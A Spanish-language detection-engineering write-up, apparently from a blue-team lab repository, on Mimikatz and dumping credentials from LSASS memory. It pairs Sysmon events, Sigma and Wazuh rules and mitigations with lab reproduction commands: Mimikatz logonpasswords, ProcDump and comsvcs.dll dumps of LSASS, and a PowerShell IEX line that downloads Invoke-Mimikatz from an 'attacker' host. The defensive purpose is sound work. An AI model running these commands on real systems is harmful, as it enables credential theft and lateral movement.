# Case 003 — Mimikatz: Volcado de credenciales en memoria

**Táctica MITRE:** Credential Access  
**Técnica:** T1003 — OS Credential Dumping  
**Sub-técnica:** T1003.001 — LSASS Memory  
**Severidad:** Crítica  
**Estado:** ✅ Documentado con regla funcional  

---

## 1. Contexto

**Mimikatz** es la herramienta de post-explotación más conocida del mundo. Desarrollada por Benjamin Delpy, permite extraer credenciales directamente desde la memoria del proceso **LSASS** (Local Security Authority Subsystem Service), que es el proceso de Windows encargado de gestionar autenticaciones.

Lo que puede extraer:
- **Hashes NTLM** — usados para Pass-the-Hash
- **Tickets Kerberos** — usados para Pass-the-Ticket
- **Contraseñas en texto plano** (en sistemas sin parche o con WDigest activo)
- **Certificados y claves privadas**

### ¿Por qué es crítico?

- Usado en prácticamente **todos los ataques ransomware** modernos
- Presente en ataques de grupos APT (APT28, Lazarus, FIN7)
- Con un hash NTLM el atacante puede moverse lateralmente **sin conocer la contraseña real**
- LSASS corre como SYSTEM — acceder a él requiere privilegios elevados, lo que indica que el atacante ya tiene control significativo

---

## 2. Reproducción en el laboratorio

> ⚠️ Solo ejecutar en entorno controlado y aislado. Requiere privilegios de administrador.

### Técnica 1: Mimikatz directo (forma clásica)

```cmd
# Ejecutar Mimikatz como administrador
mimikatz.exe

# Dentro de Mimikatz
privilege::debug
sekurlsa::logonpasswords
```

### Técnica 2: Volcado de LSASS con Task Manager (sin Mimikatz)

```
1. Abrir Task Manager como administrador
2. Pestaña Details
3. Click derecho en lsass.exe → Create dump file
4. El archivo .dmp se genera en %TEMP%
5. Transferir y procesar offline con Mimikatz
```

### Técnica 3: Volcado con ProcDump (LOLBAS)

```cmd
# ProcDump es una herramienta legítima de Sysinternals
procdump.exe -accepteula -ma lsass.exe lsass.dmp

# Procesar el dump offline
mimikatz.exe "sekurlsa::minidump lsass.dmp" "sekurlsa::logonpasswords"
```

### Técnica 4: Volcado con comsvcs.dll (sin herramientas externas)

```cmd
# Usando rundll32 — 100% living off the land
rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump <LSASS_PID> lsass.dmp full

# Obtener el PID de lsass
tasklist | findstr lsass
```

### Técnica 5: PowerShell en memoria (sin tocar disco)

```powershell
# Invoke-Mimikatz — versión in-memory
IEX (New-Object Net.WebClient).DownloadString('http://attacker/Invoke-Mimikatz.ps1')
Invoke-Mimikatz -Command "sekurlsa::logonpasswords"
```

---

## 3. Eventos generados

### Event ID 10 — Process Access (Sysmon) ⭐ El más importante

```xml
<!-- Cualquier proceso accediendo a lsass.exe con permisos de lectura de memoria -->
<EventID>10</EventID>
<SourceImage>C:\Users\atacante\mimikatz.exe</SourceImage>
<TargetImage>C:\Windows\System32\lsass.exe</TargetImage>
<GrantedAccess>0x1010</GrantedAccess>
<!-- 0x1010 = PROCESS_VM_READ | PROCESS_QUERY_LIMITED_INFORMATION -->
<!-- 0x1fffff = PROCESS_ALL_ACCESS (más agresivo) -->
```

### Event ID 1 — Process Create (Sysmon)

```xml
<!-- Mimikatz ejecutado directamente -->
<EventID>1</EventID>
<Image>C:\Users\atacante\mimikatz.exe</Image>
<CommandLine>mimikatz.exe</CommandLine>
<Hashes>SHA256=61C0810A23580CF492A6BA4F7654566108331E7A4134C968C2D6A05261B2D8A1</Hashes>
```

### Event ID 4656 — Handle al objeto LSASS (Windows Security)

```
Object Server: Security Account Manager
Object Type: Process
Object Name: \Device\HarddiskVolume3\Windows\System32\lsass.exe
Access: Read Memory (0x10)
Process Name: mimikatz.exe
```

### Event ID 4663 — Acceso a objeto (Windows Security)

```
Object Name: \Device\HarddiskVolume3\Windows\System32\lsass.exe
Access: ReadData (or ListDirectory)
Process Name: mimikatz.exe
```

### Event ID 11 — File Created (volcado a disco)

```xml
<!-- Si se genera un archivo .dmp -->
<EventID>11</EventID>
<Image>C:\Windows\System32\lsass.exe</Image>
<TargetFilename>C:\Users\atacante\lsass.dmp</TargetFilename>
```

> **Clave de detección:** El Event ID 10 de Sysmon con `TargetImage = lsass.exe` y `GrantedAccess` con flags de lectura de memoria es la señal más confiable. Casi ningún proceso legítimo necesita leer la memoria de LSASS.

---

## 4. Reglas de detección

### Sigma

```yaml
title: Mimikatz - LSASS Memory Access
id: c4d6e8f0-3456-7890-cdef-012345678901
status: test
description: |
    Detecta acceso a la memoria del proceso LSASS, indicador principal
    de volcado de credenciales con Mimikatz u otras herramientas similares.
author: briamrlz82
date: 2024/01/25
references:
    - https://attack.mitre.org/techniques/T1003/001/
    - https://github.com/gentilkiwi/mimikatz
tags:
    - attack.credential_access
    - attack.t1003.001
logsource:
    category: process_access
    product: windows
detection:
    # Detección principal: acceso a memoria de LSASS
    selection_lsass_access:
        TargetImage|endswith: '\lsass.exe'
        GrantedAccess|contains:
            - '0x1010'
            - '0x1410'
            - '0x1438'
            - '0x143a'
            - '0x1fffff'
            - '0x1f1fff'
    # Excluir procesos del sistema que legítimamente acceden a LSASS
    filter_system:
        SourceImage|startswith:
            - 'C:\Windows\System32\'
            - 'C:\Windows\SysWOW64\'
            - 'C:\Program Files\'
            - 'C:\Program Files (x86)\'
    filter_known_legit:
        SourceImage|endswith:
            - '\MsMpEng.exe'
            - '\csrss.exe'
            - '\wininit.exe'
            - '\services.exe'
            - '\lsm.exe'
            - '\svchost.exe'
    condition: selection_lsass_access and not filter_system and not filter_known_legit
falsepositives:
    - Soluciones AV/EDR que monitorean LSASS
    - Herramientas de diagnóstico del sistema
    - Algunos productos de backup con agente en el sistema
level: critical
```

### Wazuh (XML)

```xml
<group name="mimikatz,credential_access,lsass,critical">

  <!-- Regla 1: Acceso a memoria de LSASS (Event ID 10 Sysmon) -->
  <rule id="100030" level="15">
    <if_group>sysmon_event10</if_group>
    <field name="win.eventdata.targetImage" type="pcre2">(?i)lsass\.exe$</field>
    <field name="win.eventdata.grantedAccess" type="pcre2">(0x1010|0x1410|0x1438|0x143a|0x1fffff|0x1f1fff)</field>
    <description>CRÍTICO: Acceso a memoria de LSASS detectado — posible volcado de credenciales</description>
    <mitre>
      <id>T1003.001</id>
    </mitre>
    <group>lsass_access,credential_dump,critical</group>
  </rule>

  <!-- Regla 2: Mimikatz por hash conocido -->
  <rule id="100031" level="15">
    <if_group>sysmon_event1</if_group>
    <field name="win.eventdata.hashes" type="pcre2">(?i)(61C0810A23580CF492A6BA4F7654566108331E7A4134C968C2D6A05261B2D8A1|f67f74b4ba86d098f79de399f8f514ea)</field>
    <description>CRÍTICO: Hash de Mimikatz conocido detectado en ejecución de proceso</description>
    <mitre>
      <id>T1003.001</id>
    </mitre>
    <group>mimikatz_hash,critical</group>
  </rule>

  <!-- Regla 3: ProcDump sobre LSASS (LOLBAS) -->
  <rule id="100032" level="14">
    <if_group>sysmon_event1</if_group>
    <field name="win.eventdata.image" type="pcre2">(?i)procdump(64)?\.exe$</field>
    <field name="win.eventdata.commandLine" type="pcre2">(?i)lsass</field>
    <description>ALTA: ProcDump ejecutado sobre lsass.exe — posible volcado de credenciales</description>
    <mitre>
      <id>T1003.001</id>
    </mitre>
    <group>procdump_lsass,credential_dump</group>
  </rule>

  <!-- Regla 4: comsvcs.dll MiniDump (living off the land) -->
  <rule id="100033" level="15">
    <if_group>sysmon_event1</if_group>
    <field name="win.eventdata.image" type="pcre2">(?i)rundll32\.exe$</field>
    <field name="win.eventdata.commandLine" type="pcre2">(?i)(comsvcs|MiniDump|minidump)</field>
    <description>CRÍTICO: rundll32 con comsvcs.dll MiniDump — volcado de LSASS sin herramientas externas</description>
    <mitre>
      <id>T1003.001</id>
      <id>T1218.011</id>
    </mitre>
    <group>comsvcs_dump,critical,lolbas</group>
  </rule>

  <!-- Regla 5: Creación de archivo .dmp sospechoso -->
  <rule id="100034" level="12">
    <if_group>sysmon_event11</if_group>
    <field name="win.eventdata.targetFilename" type="pcre2">(?i)lsass.*\.dmp$</field>
    <description>ALTA: Archivo de volcado de lsass creado en disco</description>
    <mitre>
      <id>T1003.001</id>
    </mitre>
    <group>lsass_dumpfile,credential_dump</group>
  </rule>

  <!-- Excepción: procesos del sistema que acceden a LSASS legítimamente -->
  <rule id="100039" level="0">
    <if_sid>100030</if_sid>
    <field name="win.eventdata.sourceImage" type="pcre2">(?i)(MsMpEng|csrss|wininit|services|lsm|svchost|taskmgr)\.exe$</field>
    <description>Excepción: acceso legítimo a LSASS desde proceso del sistema</description>
  </rule>

</group>
```

---

## 5. Alerta generada

```json
{
  "timestamp": "2024-01-25T02:44:18.831+0000",
  "rule": {
    "id": "100030",
    "level": 15,
    "description": "CRÍTICO: Acceso a memoria de LSASS detectado — posible volcado de credenciales",
    "groups": ["lsass_access", "credential_dump", "critical"],
    "mitre": {
      "technique": ["T1003.001"],
      "tactic": ["Credential Access"]
    }
  },
  "agent": {
    "id": "001",
    "name": "DESKTOP-LAB",
    "ip": "192.168.1.100"
  },
  "data": {
    "win": {
      "eventdata": {
        "sourceImage": "C:\\Users\\atacante\\Desktop\\mimikatz.exe",
        "targetImage": "C:\\Windows\\System32\\lsass.exe",
        "grantedAccess": "0x1fffff",
        "sourceProcessId": "5120",
        "targetProcessId": "812",
        "callTrace": "C:\\Windows\\SYSTEM32\\ntdll.dll|C:\\Windows\\System32\\KERNELBASE.dll|UNKNOWN"
      }
    }
  }
}
```

---

## 6. Falsos positivos

| Fuente | Patrón | Acción |
|--------|--------|--------|
| Windows Defender / MsMpEng | Accede a LSASS para protección | Excluir por `sourceImage` |
| Soluciones EDR (CrowdStrike, Carbon Black) | Monitoreo activo de LSASS | Excluir por proceso del agente |
| Task Manager (volcado manual) | `taskmgr.exe` → lsass.dmp | Alertar igual — escalar para verificar |
| Herramientas de diagnóstico | Depende del vendor | Whitelist por hash verificado |

> **Regla de oro:** Un dump de LSASS por Task Manager puede ser legítimo (soporte técnico), pero **siempre debe investigarse**. La diferencia está en el contexto: ¿quién lo hizo?, ¿a qué hora?, ¿desde qué equipo?

---

## 7. Mitigación

| Control | Implementación | Prioridad |
|---------|---------------|-----------|
| Credential Guard | Virtualiza LSASS en un contenedor seguro | 🔴 Alta |
| PPL (Protected Process Light) | LSASS corre como proceso protegido | 🔴 Alta |
| Deshabilitar WDigest | `HKLM\SYSTEM\...\WDigest → UseLogonCredential = 0` | 🔴 Alta |
| ASR Rule: Block credential stealing | Rule ID: `9e6c4e1f-7d60-472f-ba1a-a39ef669e4b0` | 🔴 Alta |
| Monitoreo Event ID 10 Sysmon | Alertar sobre cualquier acceso a LSASS | 🔴 Alta |
| Privilegios mínimos | Limitar quién puede hacer `SeDebugPrivilege` | 🟡 Media |

### Habilitar Credential Guard (PowerShell)

```powershell
# Habilitar Credential Guard via registro
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\LSA" `
    -Name "LsaCfgFlags" -Value 1

# Verificar estado
Get-CimInstance -ClassName Win32_DeviceGuard -Namespace root\Microsoft\Windows\DeviceGuard
```

### Habilitar PPL para LSASS

```powershell
# Proteger LSASS como proceso protegido
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\LSA" `
    -Name "RunAsPPL" -Value 1

# Requiere reinicio para aplicar
```

### Deshabilitar WDigest (evitar credenciales en texto plano)

```powershell
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest" `
    -Name "UseLogonCredential" -Value 0
```

---

## 8. Hunting queries

### Kibana
```
event.code: "10" AND winlog.event_data.TargetImage: "*lsass.exe" AND NOT winlog.event_data.SourceImage: ("*MsMpEng.exe" OR "*svchost.exe")
```

### Buscar dumps de LSASS en disco
```
event.code: "11" AND winlog.event_data.TargetFilename: (*lsass* AND *.dmp)
```

---

## 📎 Archivos relacionados

- [`../../rules/wazuh/credential_access.xml`](../../rules/wazuh/credential_access.xml) — Reglas Wazuh
- [`../../rules/sigma/lsass_access.yml`](../../rules/sigma/lsass_access.yml) — Regla Sigma

---

## 🔗 Referencias

- [MITRE T1003.001 — LSASS Memory](https://attack.mitre.org/techniques/T1003/001/)
- [Mimikatz GitHub](https://github.com/gentilkiwi/mimikatz)
- [Microsoft — Credential Guard](https://docs.microsoft.com/en-us/windows/security/identity-protection/credential-guard/)
- [Atomic Red Team — T1003.001](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1003.001/)
- [Sysmon Event ID 10 — Process Access](https://www.ultimatewindowssecurity.com/securitylog/encyclopedia/event.aspx?eventid=90010)
